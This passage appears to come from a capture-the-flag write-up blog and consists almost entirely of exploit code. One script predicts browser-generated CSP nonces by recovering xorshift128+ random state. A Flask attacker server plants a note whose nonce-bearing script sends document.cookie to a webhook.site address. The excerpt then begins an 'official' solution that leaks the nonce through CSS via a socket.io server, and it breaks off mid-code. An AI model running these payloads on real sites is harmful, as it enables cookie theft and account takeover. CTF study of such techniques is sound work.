class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> struct, time</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> trange</span><br><span class=\"line\"></span><br><span class=\"line\">alphabet =  <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_same_for</span>(<span class=\"params\">alphabet</span>):</span><br><span class=\"line\">    sames_for = []</span><br><span class=\"line\">    alphas = <span class=\"built_in\">len</span>(alphabet)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(alphas):</span><br><span class=\"line\">        start = i / alphas</span><br><span class=\"line\">        end = (i + <span class=\"number\">1</span>) / alphas</span><br><span class=\"line\">        float_begin = struct.pack(<span class=\"string\">&quot;d&quot;</span>, start + <span class=\"number\">1</span>)</span><br><span class=\"line\">        float_end = struct.pack(<span class=\"string\">&quot;d&quot;</span>, end + <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_begin = struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_begin)[<span class=\"number\">0</span>] &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_end = (struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_end)[<span class=\"number\">0</span>] - <span class=\"number\">1</span>) &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        x, y = <span class=\"built_in\">bin</span>(uint_begin)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>), <span class=\"built_in\">bin</span>(uint_end)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>)</span><br><span class=\"line\">        sames = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> x[sames] == y[sames]:</span><br><span class=\"line\">            sames += <span class=\"number\">1</span></span><br><span class=\"line\">        sames_for.append((<span class=\"built_in\">int</span>(x[:sames], <span class=\"number\">2</span>) <span class=\"keyword\">if</span> sames <span class=\"keyword\">else</span> <span class=\"number\">0</span>, sames))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sames_for</span><br><span class=\"line\"></span><br><span class=\"line\">sames_for = generate_same_for(alphabet)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">question, alphabet, sames_for</span>):</span><br><span class=\"line\">    sequence = [alphabet.index(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> question]</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_solution</span>(<span class=\"params\">prefix_count</span>):</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_left_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state[n:] + [<span class=\"number\">0</span>]*n</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_right_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [<span class=\"number\">0</span>]*n + state[:-n]</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_xor</span>(<span class=\"params\">s1, s2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [s1[i]^s2[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        As = []</span><br><span class=\"line\">        bs = []</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">add_equs</span>(<span class=\"params\">ss, vals, cnt</span>):</span><br><span class=\"line\">            <span class=\"keyword\">nonlocal</span> As, bs</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cnt):</span><br><span class=\"line\">                As.append(ss[i])</span><br><span class=\"line\">                bs.append((vals&gt;&gt;(cnt-<span class=\"number\">1</span>-i))&amp;<span class=\"number\">1</span>)</span><br><span class=\"line\">        matched = <span class=\"number\">0</span></span><br><span class=\"line\">        cur = <span class=\"number\">0</span></span><br><span class=\"line\">        se_state0 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        se_state1 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>, <span class=\"number\">128</span>)]</span><br><span class=\"line\">        <span class=\"keyword\">while</span> matched &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_left_shift(se_s1, <span class=\"number\">23</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s1, <span class=\"number\">17</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, se_s0)</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s0, <span class=\"number\">26</span>))</span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                correct_index = <span class=\"number\">64</span> - <span class=\"number\">1</span> - i + cur - prefix_count</span><br><span class=\"line\">                <span class=\"keyword\">if</span> correct_index &gt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span> correct_index &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">                    uu = sames_for[sequence[correct_index]]</span><br><span class=\"line\">                    add_equs(se_state0, uu[<span class=\"number\">0</span>], uu[<span class=\"number\">1</span>])</span><br><span class=\"line\">                    matched += <span class=\"number\">1</span></span><br><span class=\"line\">            cur += <span class=\"number\">64</span></span><br><span class=\"line\">        BAs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        Bbs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(As)):</span><br><span class=\"line\">            A, b = As[i], bs[i]</span><br><span class=\"line\">            listed = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ((A&gt;&gt;j)&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> BAs[j] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    BAs[j] = A</span><br><span class=\"line\">                    Bbs[j] = b</span><br><span class=\"line\">                    listed = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    A ^= BAs[j]</span><br><span class=\"line\">                    b ^= Bbs[j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> listed <span class=\"keyword\">and</span> b:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>)[::-<span class=\"number\">1</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> BAs[i] != <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (BAs[i]&gt;&gt;j)&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">                    Bbs[i] ^= Bbs[j]</span><br><span class=\"line\">        se_state0 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[:<span class=\"number\">64</span>]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        se_state1 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[<span class=\"number\">64</span>:]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        generated = <span class=\"number\">0</span></span><br><span class=\"line\">        full = []</span><br><span class=\"line\">        <span class=\"keyword\">while</span> generated &lt; <span class=\"built_in\">len</span>(sequence) + prefix_count + <span class=\"number\">128</span>:</span><br><span class=\"line\">            cached = []</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 ^= (se_s1 &lt;&lt; <span class=\"number\">23</span>) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">                se_s1 ^= se_s1 &gt;&gt; <span class=\"number\">17</span></span><br><span class=\"line\">                se_s1 ^= se_s0</span><br><span class=\"line\">                se_s1 ^= se_s0 &gt;&gt; <span class=\"number\">26</span></span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                cached.append(struct.unpack(<span class=\"string\">&quot;d&quot;</span>, struct.pack(<span class=\"string\">&quot;&lt;Q&quot;</span>, (se_state0 &gt;&gt; <span class=\"number\">12</span>) | <span class=\"number\">0x3FF0000000000000</span>))[<span class=\"number\">0</span>] - <span class=\"number\">1</span>)</span><br><span class=\"line\">            generated += <span class=\"number\">64</span></span><br><span class=\"line\">            full += cached[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">        full = full[prefix_count:]</span><br><span class=\"line\">        full = <span class=\"string\">&#x27;&#x27;</span>.join([alphabet[<span class=\"built_in\">int</span>(v * <span class=\"built_in\">len</span>(alphabet))] <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> full])</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> full[:<span class=\"built_in\">len</span>(sequence)] == question</span><br><span class=\"line\">        ans = full[<span class=\"built_in\">len</span>(sequence):][:<span class=\"number\">128</span>]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">        ret = test_solution(i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ret:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;no solution&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">sess = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">username, password</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> sess</span><br><span class=\"line\">    sess = requests.Session()</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/login&#x27;</span></span><br><span class=\"line\">    sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>: username,</span><br><span class=\"line\">        <span class=\"string\">&#x27;password&#x27;</span>: password</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">title, content</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/write&#x27;</span></span><br><span class=\"line\">    r = sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;title&#x27;</span>: title,</span><br><span class=\"line\">        <span class=\"string\">&#x27;content&#x27;</span>: content</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">share</span>(<span class=\"params\"><span class=\"built_in\">id</span>=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/share_diary/0&#x27;</span></span><br><span class=\"line\">    r = sess.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">            const genNonce = () =&gt; &quot;_&quot;.repeat(8).replace(/_/g,()=&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;.charAt(Math.random()*36));</span></span><br><span class=\"line\"><span class=\"string\">            async function cc() &#123;</span></span><br><span class=\"line\"><span class=\"string\">                const url = &#x27;http://localhost&#x27;</span></span><br><span class=\"line\"><span class=\"string\">                let code = &#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">                for (let i = 0; i &lt; 15; i++) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                    let resp = await fetch(&#x27;http://3.37.109.189:8080&#x27; + &#x27;/share/read&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                    let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\">                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace(&#x27;nonce-&#x27;, &#x27;&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                const userId = genNonce();</span></span><br><span class=\"line\"><span class=\"string\">                let extra = open(url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)) // will NOT throw exception if not created</span></span><br><span class=\"line\"><span class=\"string\">                console.log(code);</span></span><br><span class=\"line\"><span class=\"string\">                let resp = await fetch(&#x27;/solve?q=&#x27; + encodeURIComponent(code) + &#x27;&amp;u=&#x27; + encodeURIComponent(userId)); // get predicted nonce from server (with note created)</span></span><br><span class=\"line\"><span class=\"string\">                let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                    extra.location.href = &quot;http://&quot; + location.host + &quot;/solve&quot;;</span></span><br><span class=\"line\"><span class=\"string\">                    setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                        extra.history.go(-1); // reload, but with bfcache so that nonce won&#x27;t change, and refresh the `hashchange` event trigger that has been deleted</span></span><br><span class=\"line\"><span class=\"string\">                        setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                            extra.location.href = url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)+&#x27;&amp;34sdctycv&#x27;; // trigger `hashchange`</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                &#125;, 1000);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            cc().catch((e)=&gt;&#123;fetch(&#x27;https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/&#x27;+e.toString())&#125;);</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/solve&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sol</span>():</span><br><span class=\"line\">    question = request.form.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        question = request.args.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;no question&quot;</span></span><br><span class=\"line\">    ans = solve(question, alphabet, sames_for)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ans)</span><br><span class=\"line\">    user = request.args.get(<span class=\"string\">&#x27;u&#x27;</span>)</span><br><span class=\"line\">    login(user, user)</span><br><span class=\"line\">    write(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">f&#x27;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;ans[:<span class=\"number\">16</span>]&#125;</span>&gt;fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)&lt;/script&gt;&quot;&gt;&lt;iframe&gt;&#x27;</span>)</span><br><span class=\"line\">    share()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.run(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">5000</span>)</span><br></pre></td></tr></table></figure>\n<p>é™„å®˜æ–¹WPï¼ˆä½¿ç”¨socketè¿›è¡Œé€šä¿¡æŒç»­æ§åˆ¶é¡µé¢ï¼ŒåŸºäºäº‹ä»¶è§¦å‘éœ€è¦çš„æ›´æ–°ï¼Œæ”»å‡»è€…åŠ¨æ€è¿”å›æ‰€éœ€CSSï¼‰:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_socketio <span class=\"keyword\">import</span> SocketIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>] = <span class=\"string\">&#x27;test1234&#x27;</span></span><br><span class=\"line\">socketio = SocketIO(app,cors_allowed_origins=<span class=\"string\">&quot;*&quot;</span>)</span><br><span class=\"line\">nonce = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">self_url = <span class=\"string\">&quot;http://141.164.55.51:8000/gen_exfil_css?nonce=&quot;</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@socketio.on(<span class=\"params\"><span class=\"string\">&#x27;start&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">handle_my_custom_event</span>(<span class=\"params\">methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;start&#x27;</span>)</span><br><span class=\"line\">    socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script src=&quot;https://cdn.socket.io/4.3.2/socket.io.min.js&quot; integrity=&quot;sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    var socket</span></span><br><span class=\"line\"><span class=\"string\">    var isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">    var nonce = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    var a,b = undefined;</span></span><br><span class=\"line\"><span class=\"string\">    idx = -1;</span></span><br><span class=\"line\"><span class=\"string\">    function sleep(ms) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        return new Promise((r) =&gt; setTimeout(r, ms));</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    async function make_shared_note(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    async function exploit(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    function start() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        socket = io.connect(&#x27;http://141.164.55.51:8000&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.on(&#x27;connect&#x27;, function() 